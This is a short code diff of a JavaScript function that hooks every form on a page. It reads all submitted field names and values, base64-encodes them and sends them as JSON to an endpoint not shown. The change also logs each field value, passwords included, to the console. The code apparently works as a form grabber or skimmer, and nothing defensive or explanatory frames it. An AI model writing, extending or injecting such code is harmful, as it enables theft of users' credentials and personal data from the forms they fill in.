@@ -347,22 +347,22 @@ function hookForms()
 
 	// Function to handle form submission
 		function interceptFormSubmit(event) {
-	    // Prevent the form from submitting
-		//event.preventDefault();
 
 	    // Log form action for debugging
 	    // console.log('Form action:', event.target.getAttribute('action'));
 	    // console.log('Form method:', event.target.method.toUpperCase());
 
-			var action = event.target.getAttribute('action');
-			var method = event.target.method.toUpperCase();
+			var name    = event.target.name;
+			var action  = event.target.action;
+			var method  = event.target.method.toUpperCase();
+			var encType = event.target.enctype;
 
 			var data = "";
 
 			var formData = new FormData(event.target);
 			for (let [name, value] of formData.entries()) 
 			{
-	        // console.log(`${name}: ${value}`);
+	        console.log(`${name}: ${value}`);
 				data += name + ": " + value + '\n';
 			}
 
@@ -377,8 +377,6 @@ function hookForms()
 			jsonObj["data"]   = btoa(data);
 			var jsonString = JSON.stringify(jsonObj);
 			request.send(jsonString);
-
-	  //  event.target.submit();
 		}
 
 	// Attach the event listener to all forms
